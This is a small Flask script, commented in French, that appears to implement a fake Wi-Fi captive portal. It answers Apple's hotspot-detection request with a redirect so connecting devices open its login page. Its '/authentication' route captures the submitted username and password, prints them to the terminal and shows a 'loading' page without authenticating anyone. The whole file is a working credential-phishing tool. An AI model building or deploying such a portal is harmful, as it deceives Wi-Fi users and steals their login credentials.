from flask import Flask, render_template, request, redirect

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/authentication', methods=['POST'])
def send_text():
    # Récupère le texte envoyé par le formulaire
    user = request.form['text_input']
    password = request.form['password_input']
    print(f"User {user} \nPassword {password}")  # Affiche le texte dans le terminal
    return render_template('loading.html')  # Affiche le texte

@app.route('/hotspot-detect.html')
def hotspot_detect():
    # Répond à la requête /hotspot-detect.html pour confirmer que le portail captive est actif
    return redirect("http://192.168.56.128:80", code=302)

if __name__ == '__main__':
    app.run(host="0.0.0.0",port="80",debug=True)  # Lancer le serveur Flask